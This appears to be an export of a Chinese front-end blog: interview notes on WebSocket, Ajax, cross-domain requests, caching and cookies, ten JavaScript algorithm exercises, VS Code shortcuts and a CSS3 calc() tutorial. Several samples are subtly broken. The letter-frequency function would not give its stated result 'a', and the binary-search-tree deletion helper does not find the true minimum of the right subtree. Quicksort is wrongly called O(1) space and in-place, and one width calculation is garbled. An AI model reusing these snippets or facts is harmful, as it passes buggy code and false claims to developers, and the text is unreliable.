WebSocket可以实现服务器主动发送数据至网页端，它和HTTP一样，是一个基于HTTP的应用层协议，跑的是TCP，所以本质上还是个长连接，双向通信，意味着服务器端和客户端可以同时发送并响应请求，而不再像HTTP的请求和响应服务端是如何主动推送信息到客户端的？几种web服务器端推送技术的简单介绍HTML5服务器推送消息的各种解决办法 事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？1、 我们在网页中的某个操作（有的操作对应多个事件）。例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 侦测到的行为2、 事件处理机制：IE是事件冒泡、firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件3、 ev.stopPropagation();注意旧ie的方法：ev.cancelBubble = true; Ajax 是什么？Ajax 的交互模型？同步和异步的区别？如何解决跨域问题？AJAX 的全称是异步的 Javascript 和 XML ，是一种创建快速动态网页的技术，通过在后台与服务器进行少量数据交互，实现网页的异步更新，在不重新加载整个界面的情况下，做到网页的部分刷新；AJAX 的交互模型（ AJAX 的过程）：用户发出异步请求；创建 XMLHttpRequest 对象；告诉 XMLHttpRequest 对象，哪个函数会处理 XMLHttpRequest 对象状态的改变，为此要把对象的 onReadyStateChange 属性设置为响应该事件的 JavaScript 函数的引用；创建请求，用 open 方法指定是 get 还是 post ，是否异步， url 地址；发送请求， send 方法；接收结果并分析；实现刷新同步异步的区别:同步：脚本会停留并等待服务器发送回复然后再继续异步：脚本允许页面继续其进程，服务器返回结果时再作处理跨域问题的解决1、 使用 document.domain+iframe 解决跨子域问题2、 使用 window.name3、 使用 flash4、 使用 iframe+location.hash5、 使用 html5 的 postMessage ；6、 使用 jsonp （创建动态 script ） js对象的深度克隆代码实现function clone(obj){ if(!obj || typeof(obj) != &apos;object&apos;) return obj; var r = Array.prototype.splice === obj.splice ? []:{}; for(var i in obj){ if(obj.hasOwnProperty(i)){ r[i] = clone(obj[i]); } } return r ; } //数组、对象都可以for in,同时针对对象必须需要判断hasOwnProperty属性，以防克隆原型链上的属性 javascript中对象的深度克隆 网站重构网站重构：在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变 UI 的情况下，对网站进行优化，在扩展的同时保持一致的 UI。对于传统的网站来说重构通常是：1、 表格(table)布局改为 DIV + CSS2、 使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对 IE6 有效的)3、 对于移动平台的优化4、 针对于 SEO 进行优化5、 深层次的网站重构应该考虑的方面6、 减少代码间的耦合7、 让代码保持弹性8、 严格按规范编写代码9、 设计可扩展的API10、 代替旧有的框架、语言(如VB)11、 增强用户体验12、 通常来说对于速度的优化也包含在重构中13、 压缩JS、CSS、image等前端资源(通常是由服务器来解决)14、 程序的性能优化(如数据读写)15、 采用CDN来加速资源加载16、 对于JS DOM的优化17、 HTTP服务器的文件缓存 如何获取UA浏览器标识（UA,User Agent）可以使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件，从而判断用户是使用电脑浏览还是手机浏览，让网页作出自动的适应。使用navigator对象:1、Navigator.appCodeName,浏览器代码名的字符表示2、appName，浏览器的名称3、appVersion 返回broswer平台和版本信息4、platform，返回运行浏览器的操作系统平台5、userAgent，返回客户机发送给服务器的useragent头部的值 &lt;script&gt; function whatBrowser() { document.Browser.Name.value=navigator.appName; document.Browser.Version.value=navigator.appVersion; document.Browser.Code.value=navigator.appCodeName; document.Browser.Agent.value=navigator.userAgent; } &lt;/script&gt; js 数组去重1、 function uniqArray(arr) { //利用es6 新的数据类型，Set() 集合来做，集合不的每个元素是不允许重复的 return [... new Set(arr)]; //return Array.from(new Set(arr)); } 2、 Array.prototype.filterOverlap = function(){ var temp = []; if(!this.length){ return []; } for(var i=0,len = this.length;i&lt;len;i++){ if(temp.indexOf(this[i])&lt;0){ temp.push(this[i]); } } return temp; } 网页缓存 cache-control1、http响应头信息，可以用来设置缓存，优化页面的性能。服务器可以通过HTTP定义的几种方式来指定在文档过期之前可以将其缓存多长时间。2、添加在HTTP响应头中3、no-store：禁止缓存对响应进行复制no-cache：在与原始服务器进行新鲜度再验证之前，缓存不能将其提供给客户端使用max-age: 从服务器将文档传来之时，可以认为此文档处于新鲜状态的秒数max-age=0;将最大使用时间设置为零，从而在每次访问的时候都进行刷新Expires响应首部：实际的过期时间而不是秒数 (GMT格式) Http头介绍:Expires,Cache-Control,Last-Modified,ETag浅谈前端性能优化（一）——Expires和Cache-Control js 操作获取和设置 cookie// 创建cookie function setCookie(name, value, expires, path, domain, secure) { var cookieText = encodeURIComponent(name) + &apos;=&apos; + encodeURIComponent(value); if (expires instanceof Date) { cookieText += &apos;; expires=&apos; + expires; } if (path) { cookieText += &quot;; path=&quot; + path } if (domain) { cookieText += &apos;; domain=&apos; + domain; } if (secure) { cookieText += &apos;; secure&apos;; } document.cookie = cookieText; } // 获取cookie function getCookie(name) { var cookieName = encodeURIComponent(name) + &apos;=&apos;; var cookieStart = document.cookie.indexOf(cookieName); var cookieValue = null; if (cookieStart &gt; -1) { var cookieEnd = document.cookie.indexOf(&apos;;&apos;, cookieStart); if (cookieEnd == -1) { cookieEnd = document.cookie.length; } cookieValue = decodeURIComponent(document.cookie.substring(cookieStart + cookieName.length, cookieEnd)); } return cookieValue; } // 删除cookie function unsetCookie(name) { document.cookie = name + &quot;= ; expires=&quot; + new Date(0); } 前端开发中通过js设置/获取cookie的一组方法]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试常见算法题总结]]></title>
    <url>%2F2018%2F02%2F26%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[十道前端面试常见算法题。 判断一个单词是否是回文思路：将字符串转换为数组，利用数组方法reverse()比较翻转后的字符串是否与源字符串一致。 实现： function checkPalindrome(str) { return str == str.split(&apos;&apos;).reverse().join(&apos;&apos;); } 去掉一组整型数组重复的值function uniqueArr(arr) { var result = []; for(var i = 0; i &lt; arr.length; i++) { if(arr.indexOf(arr[i]) === i) { result.push(arr[i]); } } return result; } uniqueArr([1,13,24,11,11,14,1,2]);//返回 [1, 13, 24, 11, 14, 2] 统计一个字符串出现最多的字母function maxDuplicateLetter(str) { //如果字符串仅有一个字符，即为该字符 if(str.length === 1) { return str; } var letterObj = {}; for(var i = 0; i &lt; str.length; i++) { if(!letterObj[str[i]]) {//存放字母的对象中还未记录过该字母出现的次数 letterObj[str[i]] = 1; } letterObj[str[i]] += 1; } //接下来寻找存放字母的对象中最大的value所对应的key var maxValue = 1; var maxKey = &apos;&apos;; for(var key in letterObj) { if(letterObj[key] &gt; maxValue) { maxValue = letterObj[key]; maxKey = key; } } return maxKey; } maxDuplicateLetter(&quot;abcdddbb&quot;);//返回 &quot;a&quot; 排序算法（1）冒泡排序依次比较相邻两个数的大小，进行位置上的交换，若按由小到大排序，第一轮可以将最大的排在最右边。平均时间复杂度：O(n^2) &nbsp;&nbsp;最好情况：O(n) &nbsp;&nbsp; 最坏情况：O(n^2)空间复杂度：O(1)排序方式:In-place稳定性:稳定 function bubbleSort(arr) { for(var i = 0; i &lt; arr.length; i++) { for(var j = 0; j &lt; arr.length - i -1; j ++) { // 由小到大排序 if(arr[j] &gt; arr[j + 1]){ var swap = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = swap; } } } return arr; } bubbleSort([3, 2, 4, 1, 7]);//返回 [1, 2, 3, 4, 7] (2)快速排序参考某个元素值，将小于它的值，放到左数组中，大于它的值的元素就放到右数组中，然后递归进行上一次左右数组的操作，返回合并的数组就是已经排好顺序的数组。平均时间复杂度: O(n log n) &nbsp;&nbsp;最好情况：O(n log n) &nbsp;&nbsp; 最坏情况：O(n^2)空间复杂度：O(1)排序方式:In-place稳定性:不稳定 function quickSort(arr) { if(arr.length &lt;= 1) { return arr; } var referValue = arr[0]; var leftArr = []; var rightArr = []; // 由小到大排序 for(var i = 1; i &lt; arr.length; i++) { if(arr[i] &lt; referValue) { leftArr.push(arr[i]); } else { rightArr.push(arr[i]); } } return quickSort(leftArr).concat([referValue], quickSort(rightArr)); } quickSort([3, 2, 4, 1, 7]);//返回 [1, 2, 3, 4, 7] 另外还有 选择排序、插入排序、希尔排序、归并排序、堆排序、计数排序、桶排序等，见博客js十大排序算法。 不借助临时变量，进行两个整数的交换利用 + – 去进行运算，类似 a = a + ( b – a) 实际上等同于最后 的 a = b; function swap([a, b]) { var b = b - a; var a = a + b; var b = a - b; return [a, b]; } swap([2, 5]);//返回 [5, 2] 使用canvas 绘制一个有限度的斐波那契数列的曲线数列长度限定在9时的图像。斐波那契数列，又称黄金分割数列，指的是这样一个数列：0、1、1、2、3、5、8、13、21、34、……fibo[i] = fibo[i-1]+fibo[i-2];即生成斐波那契数列，然后再将该数列值作为半径，利用canvas arc方法绘制曲线。 function generateFibo(n) { var fiboArr = []; var i = 0; while(i &lt; n) { if (i &lt;= 1) { fiboArr.push(i); } else { fiboArr[i] = fiboArr[i - 1] + fiboArr[i - 2]; } i++; } return fiboArr; } generateFibo(6);//返回 [0, 1, 1, 2, 3, 5] 找出正数组的最大差值相当于找到一个数组中的最大值与最小值，最大差值即为两者之差。 function maxDifference(arr) { var minValue = arr[0]; var maxDiffer = 0; for(var i = 0; i &lt; arr.length; i++) { minValue = Math.min(minValue, arr[i]); currentDiffer = arr[i] - minValue; maxDiffer = Math.max(maxDiffer, currentDiffer); } return maxDiffer; } maxDifference([10,5,11,7,8,9]);//返回 6 随机生成指定长度的字符串function randomString(n) { var rangeStr = &apos;abcdefghijklmnopqrstuvwxyz0123456789&apos;; var l = rangeStr.length; var randomStr = &apos;&apos;; for(var i = 0; i &lt; n; i++) { randomStr += rangeStr.charAt(Math.floor(Math.random() * l)); } return randomStr; } randomString(10);//返回 &quot;itfjah8rte&quot; 实现类似getElementsByClassName 的功能查找某个DOM节点下面的包含某个class的所有DOM节点？不允许使用原生提供的 getElementsByClassName、 querySelectorAll 等原生提供DOM查找的函数。 function queryClassName(node, name) { var starts = &apos;(^|[ \n\r\t\f])&apos;, ends = &apos;([ \n\r\t\f]|$)&apos;; var resultArr = [], reg = new RegExp(starts + name + ends), elements = node.getElementsByTagName(&quot;*&quot;); length = elements.length, i = 0; while(i &lt; length) { var element = elements[i]; if(reg.test(element.className)) { resultArr.push(element); } i++; } return resultArr; } // 方法2 function queryClassName2(node, name) { var elements = node.getElementsByTagName(&quot;*&quot;), length = elements.length, resultArr = []; for(var i = 0; i &lt; length; i ++) { if(elements[i].className) { var classNames = elements[i].className.split(&quot; &quot;);/*这里其实还要考虑类名间隔大于一个空格的情况*/ if(classNames.indexOf(name) !== -1) { resultArr.push(elements[i]); } } } return resultArr; } //HTML结构 &lt;ul id=&quot;ull&quot;&gt; &lt;li&gt;0&lt;/li&gt; &lt;li class=&apos;box box2&apos;&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li class=&apos;box1&apos;&gt;3&lt;/li&gt; &lt;li class=&apos;box1&apos;&gt;4&lt;/li&gt; &lt;li class=&apos;box box1&apos;&gt;5&lt;/li&gt; &lt;/ul&gt; //测试结果 window.onload = function() { node = document.getElementById(&quot;ull&quot;); queryClassName(node, &quot;box&quot;);//返回 (2) [li.box.box2, li.box.box1] queryClassName2(node, &quot;box&quot;);// 返回 (2) [li.box.box2, li.box.box1] }; JS 实现二叉查找树(Binary Search Tree)在实际使用时会根据链表和有序数组等数据结构的不同优势进行选择。有序数组的优势在于二分查找，链表的优势在于数据项的插入和数据项的删除。但是在有序数组中插入数据就会很慢，同样在链表中查找数据项效率就很低。综合以上情况，二叉树可以利用链表和有序数组的优势，同时可以合并有序数组和链表的优势，二叉树也是一种常用的数据结构。二叉查找树，也称二叉搜索树、有序二叉树（英语：ordered binary tree）是指一棵空树或者具有下列性质的二叉树： 任意节点的左子树不空，则左子树上所有结点的值均小于它的根结点的值； 任意节点的右子树不空，则右子树上所有结点的值均大于它的根结点的值； 任意节点的左、右子树也分别为二叉查找树； 没有键值相等的节点。二叉查找树相比于其他数据结构的优势在于查找、插入的时间复杂度较低。为O(log n)。二叉查找树是基础性数据结构，用于构建更为抽象的数据结构，如集合、multiset、关联数组等。 二叉树相关概念：凡是每个节点都最多有两个叉的树，都叫二叉树。查找树和排序树是一个东西。特点是中序遍历一遍的结果是单调的。这种树建出来可以用来做二分搜索。平衡树一般是排序树的一种，并且加点条件，就是任意一个节点的两个叉的深度差不多（比如差值的绝对值小于某个常数，或者一个不能比另一个深出去一倍之类的）。这样的树可以保证二分搜索任意元素都是O(log n)的，一般还附带带有插入或者删除某个元素也是O(log n)的的性质。二叉树由节点（node）和边组成。节点分为根节点、父节点、子节点。如下图所示： 红色是根节点（root）。蓝色是子节点也是父节点，绿色的是子节点。其余的线是边。节点和链表中的节点一样都可以存放数据信息。树中的边可以用自引用表示，这种引用就是C/C++里面的指针。通常来说树是顶部小，底部大，且树呈分层结构。root节点时第0层，以此类推。二叉树最多有两个节点。二叉树搜索： 二叉树一个节点左子节点的关键字小于这个节点，右子节点关键字大于或等于这个父节点。创建一个树节点。BST创建过程：(1)创建一个树节点包括左节点引用和右节点引用。(2)创建一个树结构。 创建一个树结构首先是向一个树种插入数据节点。当一棵树为null时，数据项是从树的root节点处开始插入，之后的插入顺序是根据搜索节点顺序规则进行插入。具体规则是：如果数据项比父节点的数据项要小，则插在父节点的左节点（leftNode），如果比父节点的数据项要大，则将新的node插入在父节点的右节点处（rightNode）。插入数据节点过程如下所示：插入节点的过程中其实也就是对tree遍历的过程，最终根据条件遍历到左右节点为null时进行添加新的节点。查找关键字查找关键字是数据结构一项重要操作项，在有序数组中通过二分排序效率非常高。在二叉树中的查找效率也比较高。因为二叉树的添加node的过程就是根据数据项的大小进行有序添加的，并不是毫无秩序的插入数据项。在有序的基础上进行查找关键字效率就会快很多。树的最值查找在树中查找是比较容易的，因为从root开始查找，最小值只会出现所有父节点的左节点处，同样最大值只会出现在所有父节点的沿着右节点搜索的最底层右节点处。参考自博客。删除节点给出如下二叉查找树 删除节点3之后，可以返回 或者 思路:若要删除一个BST的一个结点，需要考虑如下三种情况： 需要删除的节点下并没有其他子节点 需要删除的节点下有一个子节点（左或右） 需要删除的节点下有两个子节点（既左右节点都存在） 对这三种情况分别采取的措施是： 直接删除此结点 删除此结点，将此结点父节点连接到此结点左（右）子树 找出此结点右子树中的最小结点，用以代替要删除的结点，然后删除此最小结点 设定每个节点的数据结构： class Node { constructor(data, left, right) { this.data = data; this.left = left; this.right = right; } } 树由节点构成，由根节点逐渐延生到各个子节点，因此它基本的结构就是具备一个根节点，具备添加，查找和删除节点的方法。 // 构建BST，具备一个根节点、以及添加、查找、删除节点的方法 class BinarySearchTree { constructor() { this.root = null; } // 插入节点的方法 insert(data) { let n = new Node(data, null, null); if (!this.root) { //如果此二叉树为空，则数据项从树的root节点处开始插入 return this.root = n; } let currentNode = this.root; let parent = null; while (true) { parent = currentNode; //保存当current变为null之前的那一个父节点 if (data &lt; currentNode.data) { //插在父节点的左节点 currentNode = currentNode.left; if (currentNode === null) { //不断向左node寻找是否为null parent.left = n; break; } } else { //插在父节点的右节点 currentNode = currentNode.right; if (currentNode === null) { parent.right = n; break; } } } } // 删除数据项 remove(data) { this.root = this.removeNode(this.root, data); } // 删除节点 // 删除树中与给定值相同的节点，如果树中没有相同值的节点，则不做处理，应该保证处理之后的树仍是二叉查找树。 removeNode(node, data) { if (node === null) { // 如果根节点为空 return null; } if (data === node.data) { // 没有子节点，即node为叶子节点 if (node.left === null &amp;&amp; node.right === null) { return null; } // 要删除的节点下只有右节点 if (node.left === null) { return node.right; } // 要删除的节点下只有左节点 if (node.right === null) { return node.left; } // 要删除的节点下有两个子节点的情况 // getSmallest用于找到该节点右子树中的最小节点，用以替代要删除的节点，然后删除此最小节点 let getSmallest = function (node) { if (node.left === null &amp;&amp; node.right === null) { return node; } if (node.left !== null) { return node.left; } if (node.right !== null) { return getSmallest(node.right); } } let temNode = getSmallest(node.right); node.data = temNode.data; node.right = this.removeNode(temNode.right, temNode.data); return node; } else if (data &lt; node.data) { node.left = this.removeNode(node.left, data); return node; } else { node.right = this.removeNode(node.right, data); return node; } } // 查找方法 find(data) { let currentNode = this.root; while (currentNode !== null) { if (data === currentNode.data) { return true; } if (data &lt; currentNode.data) { if (currentNode.left !== null) { currentNode = currentNode.left; } else { return false; } } else {// data &gt; currentNode.data if (currentNode.right !== null) { currentNode = currentNode.right; } else { return false; } } } } } 有关数组的一些操作见博客后半部分前端面试中的常见的算法问题。 下面是一篇总结常见数据结构的javascript实现的文章：常见数据结构的javascript实现。]]></content>
      <categories>
        <category>js算法题</category>
      </categories>
      <tags>
        <tag>js算法题</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vscode快捷键]]></title>
    <url>%2F2018%2F02%2F26%2FvscodeKeyboardShortcuts%2F</url>
    <content type="text"><![CDATA[vscode中常用的快捷键功能。 文本编辑alt+up/down 向上/下移动单行 shift+alt+up/down 向上/下复制单行 shift+alt+f 格式化文本 command + +/- 增大/减小文本字体 Ctrl+Enter 在当前行下边插入一行 Ctrl+Shift+Enter 在当前行上方插入一行 代码行缩进： 向左缩进 Ctrl+[ &nbsp;&nbsp; 向右缩进 Ctrl+] 光标相关移动到行首：Home 移动到行尾：End 移动到文件结尾：Ctrl+End 移动到文件开头：Ctrl+Home 移动到后半个括号： Ctrl+Shift+] 选中当前行 Ctrl+i 选择从光标到行尾 Shift+End 选择从行首到光标处 Shift+Home 删除光标右侧的所有字： Ctrl+Delete 删除光标所在行: Ctrl+Shift+K 扩展/缩小选取范围： Shift+Alt+Left/Right 多行编辑(列编辑)：Alt+Shift+鼠标左键，Ctrl+Alt+Down/Up 同时选中所有匹配： Ctrl+Shift+L 回退上一个光标操作： Ctrl+U 重构代码移动到定义处： F12 定义处缩略图：只看一眼而不跳转过去 Alt+F12 列出所有引用： Shift+F12 同时修改本文件中所有匹配的： Ctrl+F12 重命名：比如要修改一个方法名，可以选中后按 F2，输入新的名字，回车，会发现所有的文件都修改了 跳转到下一个 Error 或 Warning：当有多个错误时可以按 F8 逐个跳转 查看 diff： 在 explorer 里选择文件右键 Set file to compare，然后需要对比的文件上右键选择 Compare with file_name_you_chose 左侧边栏及显示相关打开资源 ctrl+shift+E 打开搜索 ctrl+shift+F 打开git ctrl+shift+G 打开调试 ctrl+shift+D 打开扩展 ctrl+shift+X 全屏：F11 侧边栏显/隐：Ctrl+B 输出Show Output： Ctrl+Shift+U 预览markdown： Ctrl+Shift+V 编辑器与窗口管理打开一个新窗口： Ctrl+Shift+N 关闭窗口： Ctrl+Shift+W 新建文件： Ctrl+N 文件之间切换： Ctrl+Tab 切出一个新的编辑器： Ctrl+\ (也可以按住 Ctrl 鼠标点击 Explorer 里的文件名。左中右 3 个编辑器的快捷键分别为 Ctrl+1 Ctrl+2 Ctrl+3)]]></content>
      <categories>
        <category>VScode</category>
      </categories>
      <tags>
        <tag>VScode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3 calc()的使用]]></title>
    <url>%2F2018%2F01%2F23%2FCSS3-calc-%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[参考转自博客CSS3的calc()使用。 为什么使用calc()平时在制作页面的时候，总会碰到有的元素是100%的宽度。众所周知，如果元素宽度(这里的宽度是盒模型content的宽度)为100%时，其自身不带其他盒模型属性设置还好，要是有别的（比如添加了padding和border），那将导致盒子撑破。 比如说，有一个边框，或者说有margin和padding，这些都会让你的盒子撑破。我们换句话来说，如果你的元素宽度是100%时，只要你在元素中添加了border,padding,margin任何一值，都将会把元素盒子撑破（标准模式下，除IE怪异模式）。这样一来就会相当的麻烦，平时我们碰到这样的现象时，也是相当的谨慎，有时甚至无法解决，只能通过改变结构来实现。就算你通过繁琐的方法实现了，但有于浏览器的兼容性而导致最终效果不一致。虽然前面介绍的CSS3属性中的box-sizing在一定程度上解决这样的问题，其实今天的calc()函数功能实现上面的效果来得更简单。 什么是calc()calc()是css3的一个新增的功能，用来指定元素的长度。比如说，你可以使用calc()给元素的border、margin、pading、font-size和width等属性设置动态值。为何说是动态值呢?因为我们使用的表达式来得到的值。不过calc()最大的好处就是用在流体布局上，可以通过calc()计算得到元素的宽度。 calc() 能做什么calc()能让你给元素的做计算，你可以给一个div元素，使用百分比、em、px和rem单位值计算出其宽度或者高度，比如说 width: calc(50% + 2em);，这样一来你就不用考虑元素DIV的宽度值到底是多少，而把这个烦人的任务交由浏览器去计算。 calc()语法.element { width: calc(expression); } 其中”expression”是一个表达式，用来计算长度的表达式。 calc()运算规则calc()使用通用的数学运算规则，但是也提供更智能的功能： 使用“+”、“-”、“*” 和 “/”四则运算； 可以使用百分比、px、em、rem等单位； 可以混合使用各种单位进行计算； 表达式中有“+”和“-”时，其前后必须要有空格，如widht: calc(12%+5em);这种没有空格的写法是错误的； 表达式中有“*”和“/”时，其前后可以没有空格，但建议留有空格。 浏览器兼容性浏览器对calc()的兼容性还算不错，在IE9+、FF4.0+、Chrome19+、Safari6+都得到较好支持，同样需要在其前面加上各浏览器厂商的识别符，不过可惜的是，移动端的浏览器还没仅有“firefox for android 14.0”支持，其他的全军覆没。大家在实际使用时，同样需要添加浏览器的前缀 .element { /*Firefox*/ -moz-calc(expression); /*chrome safari*/ -webkit-calc(expression); /*Standard */ calc(); } 通过上面的了解，大家对calc()不在那么陌生，但对于实际的运用可能还是不太了解，那么大家就接下来跟我一起动手，通过实例来了解他吧。首先我们来看一个最常用的实例： &lt;div class=&quot;demo&quot;&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt; &lt;/div&gt; 上面的结构很简单，就是一个div.demo的元素中包含了一个div.box的元素，接下来我们一步一步来看其中的变化。第一步：添加普通样式： .demo { width: 300px; background: #60f; } .box { width: 100%; background: #f60; height: 50px; } 此时的效果很简单，就是div.box完全遮盖了div.demo，如下图所示： 第二步，在div.box上添加border和padding 这一步很棘手的事情来了，在div.box上添加10px的内距padding，同时添加5px的border： .demo { width: 300px; background: #60f; } .box { width: 100%; background: #f60; height: 50px; padding: 10px; border: 5px solid green; } 为了更好的说明问题，我在div.demo上添加了一个 padding：3px 0; .demo { width: 300px; background: #60f; padding: 3px 0; } .box { width: 100%; background: #f60; height: 50px; padding: 10px; border: 5px solid green; } 这个时候大家不知道能否想到问题会发生在哪？其实很简单，这个时候div.box的宽度大于了其容器div.demo的总宽度，从而撑破容器伸出来了，如图所示： 第三步，calc()的运用 为了解决撑破容器的问题，以前我们只能去计算div.box的宽度，用容器宽度减去padding和border的值，但有时候，我们苦于不知道元素的总宽度，比如说是自适应的布局，只知道一个百分值，但其他的值又是px之类的值，这就是难点，死卡住了。随着CSS3的出现，其中利用box-sizing来改变元素的盒模型类型实使实现效果，但今天我们学习的calc()方法更是方便。 知道总宽度是100%，在这个基础上减去boder的宽度（5px 2 = 10px）,在减去padding的宽度（10px 2 = 20px），即”100% - (10px + 5px) * 2 = 30px” ，最终得到的值就是div.box的width值： .demo { width: 300px; background: #60f; padding: 3px 0; } .box { background: #f60; height: 50px; padding: 10px; border: 5px solid green; width: 90%;/*写给不支持calc()的浏览器*/ width:-moz-calc(100% - (10px + 5px) * 2); width:-webkit-calc(100% - (10px + 5px) * 2); width: calc(100% - (10px + 5px) * 2); } 这样一来，通过calc()计算后，div.box不在会超出其容器div.demo的宽度，如图所示： 采用calc()方法的自适应布局demo在这个布局中，采用了自适应布局。整个布局包含了“头部”、“主内容”、“边栏”和“脚部”，并且“主内容”居左，“边栏”靠右。html结构如下： &lt;!-- 头部 --&gt; &lt;div id=&quot;header&quot;&gt;我是头部&lt;/div&gt; &lt;!-- 内容区容器 --&gt; &lt;div class=&quot;wrapper&quot;&gt; &lt;!-- 主内容 --&gt; &lt;div id=&quot;main&quot;&gt;我是主内容区&lt;/div&gt; &lt;!-- 右边栏 --&gt; &lt;div id=&quot;accessory&quot;&gt;我是右边栏&lt;/div&gt; &lt;/div&gt; &lt;!-- 脚部 --&gt; &lt;div id=&quot;footer&quot;&gt;我是脚部&lt;/div&gt; 1、在body中设置一个内距，并附上一些基本的样式 body { background: #E8EADD; color: #3C323A; padding: 20px; } 2、设置主容器“wrapper”的样式 主容器的宽度是“100% - 20px * 2”,并且水平居中： .wrapper { width: 1024px; /* Fallback for browsers that don&apos;t support the calc() function */ width: -moz-calc(100% - 40px); width: -webkit-calc(100% - 40px); width: calc(100% - 40px); margin: auto; } 给不支持calc()的浏览器设置了一个固定宽度值“1024px”。 3、给header和footer设置样式 这个例子中的header和footer很简单，给他们添加了一个内距为20px，其他就是一些基本的样式设置，那么其对应的宽度应该是100% - 20px * 2 #header { background: #f60; padding: 20px; width: 984px;/*Fallback for browsers that don&apos;t support the calc() function*/ width: -moz-calc(100% - 40px); width: -webkit-calc(100% - 40px); width: calc(100% - 40px); } #footer { clear:both; background: #000; padding: 20px; color: #fff; width: 984px;/* Fallback for browsers that don&apos;t support the calc() function */ width: -moz-calc(100% - 40px); width: -webkit-calc(100% - 40px); width: calc(100% - 40px); } 4、给主内容设置样式 给主内容设置了一个8px的边框，20px的内距，并且向左浮动，同时设置了一个向右的外边距“20”px，关键之处，我们主内容占容器宽度的75%，这样一来，主内容的宽度应该是75% - 8px * 2 - 20px * 2 #main { border: 8px solid #B8C172; float: left; margin-bottom: 20px; margin-right: 20px; padding: 20px; width: 704px; /* Fallback for browsers that don&apos;t support the calc() function */ width: -moz-calc(75% - 20px * 2 - 8px * 2); width: -webkit-calc(75% - 20px * 2 - 8px * 2); width: calc(75% - 20px * 2 - 8px * 2); } 5、设置右边栏样式 给边栏设置了一个25%的宽度，其除了包含8px的边框，10px的内距外，还有主内容外距20px也要去掉，不然整个宽度与容器会相差20px,换句话说就会撑破容器掉下来。因此边栏的实际宽度应该是25% - 10px * 2 - 8px * 2 -20px #accessory { border: 8px solid #B8C172; float: right; padding: 10px; width: 208px; /* Fallback for browsers that don&apos;t support the calc() function */ width: -moz-calc(25% - 10px * 2 - 8px * 2 - 20px); width: -webkit-calc(25% - 10px * 2 - 8px * 2 - 20px); width: calc(25% - 10px * 2 - 8px * 2 - 20px); } 完整代码见github。 另附一篇移动端页面布局，讲得比较好。]]></content>
      <categories>
        <category>CSS3</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【interview questions about CSS】 from牛客网]]></title>
    <url>%2F2018%2F01%2F13%2Finterview-questions-about-CSS%2F</url>
    <content type="text"><![CDATA[来自牛客网前端面试常考知识点 HTML+CSS 篇学习总结。 CSS 盒子模型CSS盒子模型组成：外边距（margin）、边框（border）、内边距（padding）、内容（content）。CSS盒子模型有两种，分别是标准 W3C 盒子模型和 IE 盒子模型。W3C标准盒子模型:标准W3C 盒子模型的范围包括 margin、border、padding、content， content 部分不包含其他部分。width(content) = content盒子模型占据的宽度= width + padding + border + margin盒子的实际宽度大小= width + padding + borderIE盒子模型:IE 盒子模型的范围也包括 margin、border、padding、content，和标准 W3C 盒子模型不同的是：IE 盒子模型的 content 部分包含了 border 和 pading。width(content) = content + padding-left + padding-right + border-left + border-right盒子模型占据的宽度= width + margin盒子的实际宽度大小= width参考标准盒子模型和IE盒子模型。 CSS选择器的类型类型：基础的选择器、组合选择器、属性选择器、伪类、伪元素。参考CSS选择器笔记-阮一峰。 CSS优先级、计算特殊值优先级(1) 同类型，同级别的样式后者先于前者(2) ID选择器(#example) &gt; 类选择器(.example)|属性选择器([type=”radio”])|伪类(:hover) &gt; 标签选择器(h1)|伪元素(::before)(3) 内联 &gt; ID选择器 &gt; 类|伪类|属性 &gt; 标签|伪元素 &gt; 继承 &gt; 通用选择器()(4) 具体 &gt; 泛化的，特殊性即css优先级(5) 近的 &gt; 远的 (内联样式 &gt; 内部样式表 &gt; 外部样式表) 内联样式：内嵌在元素中，&lt;span style=&quot;color:red&quot;&gt;span&lt;/span&gt; 内部样式表：在页面中的样式，写在&lt;style&gt;&lt;/style&gt;中的样式 外部样式表：单独存在一个css文件中，通过link引入或import导入的样式有个例外的情况，就是如果外部样式放在内部样式的后面，则外部样式将覆盖内部样式。(6) !important 权重最高，比 inline style 还要高*选择器的优先权-计算特殊性值 内联样式表的权值最高 1000； ID 选择器的权值为 100 Class 类选择器的权值为 10 HTML 标签选择器的权值为 1CSS 优先级法则：A 选择器都有一个权值，权值越大越优先；B 当权值相等时，后出现的样式表设置要优于先出现的样式表设置；C 创作者的规则高于浏览者：即网页编写者设置的CSS 样式的优先权高于浏览器所设置的样式；D 继承的CSS 样式不如后来指定的CSS 样式；E 在同一组属性设置中标有“!important”规则的优先级最大 动态改变层中内容的方法通过innerHTML()，innerText()方法动态添加内容和文本。 常见浏览器兼容性问题与解决方案(1)一：不同浏览器的标签默认的margin和padding不同问题症状：随便写几个标签，不加样式控制的情况下，各自的margin 和padding差异较大。碰到频率:100%解决方案：CSS样式初始化，即将使用到的有默认margin,padding值的标签的默认值置为0；或者用 *{margin:0;padding:0;}。但第二种方式不推荐，全局重置浏览器的默认样式，是一种粗暴的方式，会降低效率，使用第一种方式重置部分样式就可以了。(2)二：块属性标签float后，又有横向的margin情况下，在IE6显示margin比设置的大问题症状:常见症状是IE6中后面的一块被顶到下一行碰到频率：90%（稍微复杂点的页面都会碰到，float布局最常见的浏览器兼容问题）解决方案：在float的标签样式控制中加入 display:inline;将其转化为行内属性备注：我们最常用的就是div+CSS布局了，而div就是一个典型的块属性标签，横向布局的时候我们通常都是用div 